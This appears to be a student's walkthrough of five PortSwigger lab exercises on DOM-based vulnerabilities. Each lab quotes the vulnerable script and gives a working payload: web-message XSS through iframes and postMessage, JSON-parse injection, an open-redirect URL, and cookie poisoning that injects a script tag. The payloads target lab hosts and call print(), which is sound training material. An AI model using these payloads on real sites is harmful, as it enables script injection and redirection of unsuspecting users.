# DOM-based vulnerabilities

Get details at [here](https://portswigger.net/web-security/dom-based)

---

[Lab 1](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages): DOM XSS using web messages

Description of this lab: construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function triggered by web messaging

Check the source code, we can see this website has `addEventListener` function for listening to event

```js
    <script>
        window.addEventListener('message', function(e) {
            document.getElementById('ads').innerHTML = e.data;
        })
    </script>             
```             

Using this script for exploit server, to send message including `iframe` to website, and it will be executed when website load error, and solved the lab 

`<iframe src="https://0ace002803d991c3c25ff81400bb00af.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`

[Lab 2](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url): DOM XSS using web messages and a JavaScript URL

Description of this lab: demonstrates a DOM-based redirection vulnerability that is triggered by web messaging

Check the source code, we can see this website has `addEventListener`, `location.href` function for listening to event, 

```js
   <script>
        window.addEventListener('message', function(e) {
            var url = e.data;
            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                location.href = url;
            }
        }, false);
    </script>              
```
Using this script for exploit server, and solved the lab.

`<iframe src="https://0a52008a03c68061c212a75100ec00e5.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`


[Lab 3](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse): DOM XSS using web messages and json parse

Description of this lab: construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function

Check the code, and we have this script for listening to event

```js
    <script>
                        window.addEventListener('message', function(e) {
                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
                            document.body.appendChild(iframe);
                            try {
                                d = JSON.parse(e.data);
                            } catch(e) {
                                return;
                            }
                            switch(d.type) {
                                case "page-load":
                                    ACMEplayer.element.scrollIntoView();
                                    break;
                                case "load-channel":
                                    ACMEplayer.element.src = d.url;
                                    break;
                                case "player-height-changed":
                                    ACMEplayer.element.style.width = d.width + "px";
                                    ACMEplayer.element.style.height = d.height + "px";
                                    break;
                            }
                        }, false);
                    </script>
```

Using this script for body exploit server, click to store and deliver to victim button, then solved the lab.

```html
    <iframe src=https://0a0a00c40438df56c0ea1539003800f9.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

[Lab 4](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection): DOM-based open redirection

Description of this lab: exploit this vulnerability and redirect the victim to the exploit server

In this website, there is back button for redirect to home page using function `location.href`, and we can see the code

```html
    <a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
```

Using this URL to exploit: `https://0a52008a03c68061c212a75100ec00e5.web-security-academy.net/post?postId=1&url=https://0a9600e8031e8046c2bda67801c40046.exploit-server.net/`

[Lab 5](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation): DOM-based cookie manipulation

Description of this lab: exploit server to direct the victim to the correct pages with injecting a cookie that will cause XSS on a different page and call the print() function

Go to any post and check the code, we can see it has this script for remember last viewed product:

```js
    <script>
        document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
    </script>
```
Using this script for exploit server, `onload` event handler makes victim is redirected to the main page, unaware that this manipulation ever took place. While the victim's browser has the poisoned cookie saved, loading the main page will cause the payload to execute and call the print() function

```html
    <iframe src="https://0aa9003a03f3fdb3c0fc0d8400090025.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0aa9003a03f3fdb3c0fc0d8400090025.web-security-academy.net';window.x=1;">
```
